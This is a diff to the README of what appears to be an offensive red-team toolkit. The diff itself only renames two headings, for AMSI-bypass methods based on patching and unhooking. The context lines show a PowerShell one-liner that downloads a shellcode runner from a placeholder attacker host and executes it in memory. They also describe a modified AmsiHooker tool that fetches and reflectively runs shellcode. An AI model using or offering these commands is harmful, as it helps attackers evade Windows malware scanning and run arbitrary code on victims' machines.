@@ -130,7 +130,7 @@ Nice resource to have:
 - https://amsi.fail/ 
 
 
-#### 1.2.1 Method 1
+#### 1.2.1 Method 1 (Patching)
 The execution of 1st method (Patching) is straight forward and uses well-known methodologies.
 
 ```
@@ -150,7 +150,7 @@ You can copy the ```payloads/AMSI/shellcode_runner.txt``` to your web server as 
 powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.html')); 
 ``` 
 
-#### 1.2.2 Method 2
+#### 1.2.2 Method 2 (Unhooking)
 To unhook AMSI, I've used the project by **jfmaes - AmsiHooker** (https://github.com/jfmaes/AmsiHooker) and I've done some small modifications. When AmsiHooker executable will launched, it will download the Shellcode Runner from your web server and it will reflectively execute it.
 
 **Steps**
